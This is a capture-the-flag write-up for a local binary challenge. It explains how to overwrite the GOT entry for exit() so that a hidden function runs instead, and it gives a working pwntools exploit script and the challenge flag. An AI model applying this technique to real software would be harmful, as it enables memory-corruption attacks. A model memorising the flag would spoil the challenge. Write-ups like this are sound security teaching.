# 🔑 Write-Up

Using ida we see that the main function does nothing. But we noticed `give_the_man_a_guitar()` function. What we can do is ovveride the pointer to `exit()` to point to  `give_the_man_a_guitar()` function, so that when `exit(0)` is called at the end, it actually calls the other function.

```python
from pwn import *

elf = ELF('./vuln')

r = process('./vuln')
r.sendline(b'y')
r.sendline(str(elf.functions['give_the_man_a_guitar'].address))
r.sendline(str(elf.got['exit']))
r.interactive()
```

P.S.: once you run this script, the `temp` file'll get deleted, so if you want to re-try the challenge, you have to restore it.

### 🚩 Flag 

```plain
SPRITZ{St4nDndTTM4L3}
```

[small reward, enjoy](https://www.youtube.com/watch?v=zB_q1I0leoI)